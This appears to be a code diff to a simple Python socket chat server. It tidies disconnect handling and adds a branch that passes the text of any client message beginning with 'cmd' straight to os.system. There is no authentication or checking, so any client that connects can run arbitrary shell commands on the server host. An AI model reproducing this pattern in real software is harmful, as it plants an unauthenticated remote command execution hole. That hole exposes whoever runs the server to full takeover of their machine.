@@ -1,5 +1,6 @@
 import socket 
 import threading
+import os
 
 HEADER = 64 
 PORT = 5000
@@ -14,6 +15,7 @@ server.bind(ADDR)
 
 clients = []
 
+
 def broadcast(msg: str):
     for client in clients:
         client.send(msg.encode(FORMAT))
@@ -26,11 +28,18 @@ def handleConnection(conn: socket, addr):
         # Recieve the header, then decode the message using the length of the message
         msg_length = conn.recv(HEADER).decode(FORMAT)
         if msg_length:
-            msg_length= int(msg_length)
+            msg_length = int(msg_length)
             msg = conn.recv(msg_length).decode(FORMAT)
             if msg == DISCONNECTED_MESSAGE:
+                print(f"{addr} has disconnected!")
+                clients.pop(clients.index(conn))
                 connected = False
                 break
+            else:
+                if msg[:3] == "cmd":
+                    print(f"Remote system running command: {msg[3:]}")
+                    print("Output: ", end="")
+                    os.system(msg[3:])
             clients.append(conn)
             broadcast(msg)
 
